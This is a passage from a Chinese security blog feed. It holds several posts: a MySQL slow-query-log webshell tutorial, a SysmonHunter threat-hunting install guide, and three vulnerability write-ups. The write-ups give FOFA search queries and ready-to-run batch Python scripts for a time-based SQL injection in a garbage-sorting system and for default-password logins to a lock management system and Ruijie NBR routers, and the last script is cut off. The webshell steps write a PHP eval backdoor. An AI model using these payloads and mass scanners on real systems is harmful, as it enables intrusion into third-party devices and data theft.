<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</span><br><span class="line">show variables like &#x27;%slow_query_log%&#x27;;		--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;				--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;	--修改日志文件路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(11);				--写shell</span><br></pre></td></tr></table></figure>

<h4 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h4><p>使用<a href="https://github.com/AntSwordProject/antSword">中国蚁剑</a>连接shell；</p>
<p>浏览器访问shell：<a href="http://192.168.220.130/shell/shell.php">http://192.168.220.130/shell/shell.php</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191655678.png" alt="image-20211101191655678"></p>
<p>添加一条shell数据；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191826638.png" alt="image-20211101191826638"></p>
<p>启用虚拟终端执行命令；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191936639.png" alt="image-20211101191936639"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://dropann.github.io/p/9409b6b3.html">https://dropann.github.io/p/9409b6b3.html</a></li>
<li><a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></li>
</ol>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>SysmonHunter安装</title>
    <url>/2021/10/30/SysmonHunter%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>编写“Threat Hunt系列”的指导文章主要原因是，安全研究人员在编写渗透测试文章后并没有提供检测技术。渗透测试人员虽然完成了很多出色的工作、描述了对手所使用的工具和技术，但是只有少数人愿意共享出用于检测他们所使用的工具或者编写的代码。</p>
<p>本文主要讲述<a href="https://github.com/baronpan/SysmonHunter">SysmonHunter</a>的安装部署及基本使用。</p>
<hr>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><blockquote>
<ol>
<li><p>安装环境：centos 7；</p>
</li>
<li><p>SysmonHunter项目下载地址：<a href="https://github.com/baronpan/SysmonHunter">https://github.com/baronpan/SysmonHunter</a></p>
<blockquote>
<p>默认安装路径/root</p>
</blockquote>
</li>
<li><p>Elasticsearch</p>
<blockquote>
<p><a href="https://blog.csdn.net/y472360651/article/details/78751859">安装jdk1.8.0</a></p>
</blockquote>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_41846320/article/details/81251990">安装Elasticsearch 6.3.0</a></p>
<p><code>wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.3.0.tar.gz</code></p>
<p>默认安装路径：/opt/elasticsearch-6.3.0/</p>
</blockquote>
<blockquote>
<p><a href="https://blog.csdn.net/u014516601/article/details/82687895">安装Elasticsearch 6.3的head插件</a></p>
<p>Head插件安装路径：/opt/elasticsearch-6.3.0/head</p>
</blockquote>
</li>
<li><p>Neo4j安装</p>
<blockquote>
<p><code>apt install neo4j</code></p>
<p>安装完后，默认用户密码:neo4j/neo4j</p>
<p>默认安装路径：/usr/share/neo4j</p>
</blockquote>
</li>
<li><p>Python 2.7.x安装</p>
<blockquote>
<p>kali上默认2.7.15，安装SysmonHunter三方python库：<code>pip install -r requirements.txt</code></p>
</blockquote>
</li>
</ol>
</blockquote>
<h2 id="服务外连配置"><a href="#服务外连配置" class="headerlink" title="服务外连配置"></a>服务外连配置</h2><ol>
<li><p><strong>Web应用开启外连；</strong></p>
<p>执行<code>vim server.py</code>，配置如下：</p>
</li>
</ol>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsA13A.tmp.jpg" alt="img"></p>
<ol start="2">
<li><p><strong>es组件开启外连；</strong></p>
<p>执行<code>vim elasticsearch.yml</code>，配置如下：</p>
</li>
</ol>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps4873.tmp.jpg" alt="img"></p>
<p>​        配置es组件允许head跨域连接，配置如下：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsAD97.tmp.jpg" alt="img"></p>
<ol start="3">
<li><p>配置neo4j允许外连;</p>
<p>执行<code>vim  neo4j.conf</code>，配置如下：</p>
</li>
</ol>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps132E.tmp.jpg" alt="img"></p>
<h2 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h2><ul>
<li>开启图数据库：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# neo4j start   </span><br></pre></td></tr></table></figure>

<ul>
<li>开启ES</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# useradd es</span><br><span class="line">root# su es</span><br><span class="line">es$ /opt/elasticsearch-6.3.0/bin/elasticsearch -d</span><br><span class="line">es$ exit</span><br></pre></td></tr></table></figure>

<ul>
<li>开启ES head插件服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# cd /opt/elasticsearch-6.3.0/head</span><br><span class="line">root# nohup grunt server &amp;</span><br></pre></td></tr></table></figure>

<ul>
<li>开启项目web应用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root# cd /root/SysmonHunter/</span><br><span class="line">root# python server.py -c conf/example.conf</span><br></pre></td></tr></table></figure>

<h2 id="客户端传输数据"><a href="#客户端传输数据" class="headerlink" title="客户端传输数据"></a>客户端传输数据</h2><p>使用Python脚本将客户端的数据传输至服务端处理，并推送到ES。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python agent.py -c conf/example.conf -t csv -i test.csv</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsCC9E.tmp.jpg" alt="img"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wpsF258.tmp.jpg" alt="img"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps8790.tmp.jpg" alt="img"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/wps5096.tmp.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>Threat Hunt</category>
      </categories>
  </entry>
  <entry>
    <title>SQL注入-智能垃圾分类管理系统</title>
    <url>/2021/10/30/SQL%E6%B3%A8%E5%85%A5-%E6%99%BA%E8%83%BD%E5%9E%83%E5%9C%BE%E5%88%86%E7%B1%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>智慧垃圾分类管理系统应用于智能垃圾桶、厨余垃圾桶、智能果皮箱生产的企业，依托AI技术、人脸识别、移动互联网、大数据、物联网等。该系统存在sql注入漏洞，攻击者可获取数据库敏感信息。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>全版本？</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;智能垃圾分类管理系统&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211030173323420.png" alt="image-20211030173323420"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>无</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在登录页面使用burp抓取页面流量；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101090915969.png" alt="image-20211101090915969"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /ghc_master/data/action.admindata.php HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx</span><br><span class="line">Content-Length: 96</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.62</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://xxx.xxx.xxx.xxx</span><br><span class="line">Referer: http://xxx.xxx.xxx.xxx/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">do=adminlogin&amp;username=admin&#x27; AND (SELECT 2847 FROM (SELECT(SLEEP(5)))trlL)-- sNmL&amp;password=4224</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211030173422648.png" alt="image-20211030173422648"></p>
<p>如果在5秒后返回了1，说明存在sql注入漏洞；</p>
<h3 id="批量POC"><a href="#批量POC" class="headerlink" title="批量POC"></a>批量POC</h3><p>以下python脚本，可批量进行检测；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning  <span class="comment">#消除警告</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  <span class="comment"># 消除警告</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longer</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++FOFA:title=&quot;智能垃圾分类管理系统&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++python xxx.py -u/--url http://xxx.xxx.xxx.xxx&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++python xxx.py -f/--file xxx.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+++作者:longer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-----------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    longer()</span><br><span class="line">    sys.exit()</span><br><span class="line">p = argparse.ArgumentParser(description=<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;目标url&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;文件&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">xp = p.parse_args()</span><br><span class="line">url = xp.url</span><br><span class="line">file = xp.file</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;do=adminlogin&amp;username=admin&#x27; AND (SELECT 2847 FROM (SELECT(SLEEP(5)))trlL)-- sNmL&amp;password=4224&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0(Windows NT 10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/90.0.4430.212Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=hfq66id9bum90sovr9gmn7klde&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    url1 = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = url+<span class="string">&#x27;/ghc_master/data/action.admindata.php&#x27;</span></span><br><span class="line">        r = requests.post(url = url ,headers =headers,data=data ,timeout = <span class="number">15</span>,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.text ==<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(url1 + <span class="string">&#x27;存在sql注入&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(url1+<span class="string">&#x27;不存在sql注入&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(url1+<span class="string">&quot;异常&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> file!= <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(file,<span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        url=i.strip()</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;http:&#x27;</span>) != <span class="number">1</span> <span class="keyword">and</span> url.startswith(<span class="string">&#x27;https:&#x27;</span>) != <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">        url =url</span><br><span class="line">        url1 = url</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t = url + <span class="string">&#x27;/ghc_master/data/action.admindata.php&#x27;</span></span><br><span class="line">            r =requests.post(url=url,data=data,headers=headers,timeout=<span class="number">15</span>,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;存在sql注入&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;不存在注入&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(url1+<span class="string">&#x27;异常&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>锁群管理系统v2.0存在弱口令漏洞</title>
    <url>/2021/11/01/%E9%94%81%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fv2.0%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>锁群管理系统v2.0存在弱口令漏洞。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>锁群管理系统v2.0</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;锁群管理系统v2.0&quot;</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>无</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>万能的度娘上查询到锁群管理系统操作手册里面有账号和密码；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101201939208.png" alt="image-20211101201939208"></p>
<p>后台界面如下；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101202459009.png" alt="image-20211101202459009"></p>
<p>在后台登陆界面使用操作手册里面的账号和密码成功的登录后台；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101202427411.png" alt="image-20211101202427411"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning  <span class="comment">#消除警告</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  <span class="comment"># 消除警告</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longer</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -u/--url http://xxx.xxx.xxx.xxx&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -f/--file x.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;FOFA:title=&quot;锁群管理系统v2.0&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    longer()</span><br><span class="line">    sys.exit()</span><br><span class="line">p = argparse.ArgumentParser(description=<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;输入文件&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = p.parse_args()</span><br><span class="line"></span><br><span class="line">url = a.url</span><br><span class="line"></span><br><span class="line">file = a.file</span><br><span class="line"></span><br><span class="line">headers= &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;ASP.NET_SessionId=pjb41rehvxilis32hfgus0r5&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> url != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    furl = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url =furl+<span class="string">&#x27;/inc/CheckLogin.aspx?checkLogin=login&amp;un=admin&amp;pw=123456&#x27;</span></span><br><span class="line">        r= requests.get(url=url,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(furl+<span class="string">&#x27;存在弱口令&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(furl+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(furl+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    text =file</span><br><span class="line">    f = <span class="built_in">open</span>(text,<span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        url = i.strip()</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;http:&#x27;</span>) != <span class="number">1</span> <span class="keyword">and</span> url.startswith(<span class="string">&#x27;https:&#x27;</span>) != <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">        url1 = url</span><br><span class="line">        url2=url</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url1 = url+<span class="string">&#x27;/inc/CheckLogin.aspx?checkLogin=login&amp;un=admin&amp;pw=123456&#x27;</span></span><br><span class="line">            r =requests.post(url=url1,headers=headers,timeout = <span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(url2+<span class="string">&#x27;存在弱口令&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(url2+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(url2+<span class="string">&#x27;不存在弱口令&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>锐捷NBR路由器存在弱口令漏洞</title>
    <url>/2021/11/01/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>锐捷网络股份有限公司NBR路由器存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>NBR路由器</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;NBR路由器&quot;</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>无</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>百度上查询到NBR路由器的默认账号密码为guest/guest；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101195444160.png" alt="image-20211101195444160"></p>
<p>在NBR后台管理界面使用默认账号密码成功登录后台；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101195603393.png" alt="image-20211101195603393"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning  <span class="comment">#消除警告</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  <span class="comment"># 消除警告</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longer</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;FOFA:title=&quot;锐捷网络--NBR路由器--登录界面&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -u/--url http://xxx.xxx.xxx.xxx&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;python xxx.py -f/--file xxx.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;longer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    longer()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">par = argparse.ArgumentParser(description=<span class="string">&#x27;longer help&#x27;</span>)</span><br><span class="line"></span><br><span class="line">par.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span> ,<span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">par.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;输入文件&#x27;</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = par.parse_args()</span><br><span class="line"></span><br><span class="line">url =a.url</span><br><span class="line">file =a.file</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/plain;charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;c_name=; hardtype=NBR2000G; web-coding=gb2312; currentURL=; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic Z3Vlc3Q6Z3Vlc3Q=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;command=show clock&amp;strurl=exec%04&amp;mode=%02PRIV_EXEC&amp;signname=Red-Giant.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> url != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    url = url</span><br><span class="line">    url2 =url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url1 =url+<span class="string">&#x27;/WEB_VMS/LEVEL15/&#x27;</span></span><br><span class="line">        r =requests.post(url=url1 , data=data,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;WebCLI&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(url2+<span class="string">&#x27;NBR路由器存在弱口令：guest/guest&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(url2+<span class="string">&#x27;NBR路由器不存在弱口令&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(url2+<span class="string">&#x27;异常&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    p = <span class="built_in">open</span>(file,<span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p.readlines():</span><br><span class="line">        url = i.strip()</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) != <span class="number">1</span> <span class="keyword">and</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>) != <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span>+url</span><br><span class="line">        url=url</span><br><span class="line">        url1=url</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = url +<span class="string">&#x27;/WEB_VMS/LEVEL15/&#x27;</span></span><br><span class="line">            r=requests.post(url=url,headers=headers,data=data,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == 